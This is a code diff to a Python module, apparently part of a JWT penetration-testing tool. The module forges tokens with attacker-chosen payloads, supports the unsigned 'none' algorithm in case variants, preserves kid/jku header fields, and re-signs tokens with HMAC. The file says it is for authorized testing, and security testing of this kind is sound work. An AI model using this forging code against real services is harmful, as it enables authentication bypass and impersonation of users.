@@ -1,9 +1,11 @@
-"""Token forging - for authorized security testing only.
+﻿"""Token forging - for authorized security testing only.
 
 This module is dangerous. Don't be stupid with it.
 """
 
 import jwt
+import hmac
+import hashlib
 import json
 import logging
 import base64
@@ -12,20 +14,26 @@ from core.parser import _base64url_decode
 
 logger = logging.getLogger(__name__)
 
-# These algs don't sign anything - server is vulnerable if it accepts them
 NO_SIGNATURE_ALGORITHMS = {"none", "None", "NONE", "nOnE"}
+
+_HMAC_HASH = {
+    "HS256": hashlib.sha256,
+    "HS384": hashlib.sha384,
+    "HS512": hashlib.sha512,
+}
 
 
 def _b64url(data: bytes) -> str:
     """base64url encode without padding."""
-    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
 
 
-def forge_token(token: str, new_payload: dict, secret: str,
-                algorithm: str = "HS256") -> str:
+def forge_token(
+    token: str, new_payload: dict, secret: str, algorithm: str = "HS256"
+) -> str:
     """Forge a JWT with a custom payload.
 
-    We preserve the original header's non-standard fields (kid, jku, etc.)
+    Preserves the original header's non-standard fields (kid, jku, etc.)
     because some servers use those for key lookup.
 
     Args:
@@ -41,34 +49,43 @@ def forge_token(token: str, new_payload: dict, secret: str,
         ValueError: if forging fails
     """
     if algorithm in NO_SIGNATURE_ALGORITHMS:
-        logger.warning("Forging with 'none' algorithm - server is critically vulnerable!")
+        logger.warning(
+            "Forging with 'none' algorithm - server is critically vulnerable!"
+        )
 
     try:
         # Peek at original header so we preserve kid/jku/etc
-        parts = token.split('.')
+        parts = token.split(".")
         if len(parts) != 3:
             raise ValueError("Original token isn't a valid JWT")
-        original_header = json.loads(_base64url_decode(parts))
+
+
+        original_header = json.loads(_base64url_decode(parts[0]))
 
         # Build new header - override alg/typ, keep everything else
         new_header = {"alg": algorithm, "typ": "JWT"}
         for k, v in original_header.items():
-            if k not in ('alg', 'typ'):
+            if k not in ("alg", "typ"):
                 new_header[k] = v
 
-        header_b64 = _b64url(json.dumps(new_header, separators=(',', ':')).encode())
-        payload_b64 = _b64url(json.dumps(new_payload, separators=(',', ':')).encode())
+        header_b64 = _b64url(json.dumps(new_header, separators=(",", ":")).encode())
+        payload_b64 = _b64url(json.dumps(new_payload, separators=(",", ":")).encode())
+        signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
 
         # 'none' alg = empty signature
         if algorithm in NO_SIGNATURE_ALGORITHMS:
             return f"{header_b64}.{payload_b64}."
 
-        # Sign and stitch together (jwt.encode gives us header.payload.sig
-        # but we want our own header for the custom fields)
-        signed = jwt.encode(new_payload, secret, algorithm=algorithm)
-        signature = signed.split('.')
+        # HS algorithms: sign directly
+        if algorithm in _HMAC_HASH:
+            digest_mod = _HMAC_HASH[algorithm]
+            sig = hmac.new(secret.encode("utf-8"), signing_input, digest_mod).digest()
+            return f"{header_b64}.{payload_b64}.{_b64url(sig)}"
 
-        return f"{header_b64}.{payload_b64}.{signature}"
+        # RS/ES algorithms: use PyJWT's signer
+        signed = jwt.encode(new_payload, secret, algorithm=algorithm)
+        signature_b64 = signed.rsplit(".", 1)[-1]
+        return f"{header_b64}.{payload_b64}.{signature_b64}"
 
     except Exception as e:
         raise ValueError(f"Forgery failed: {e}")
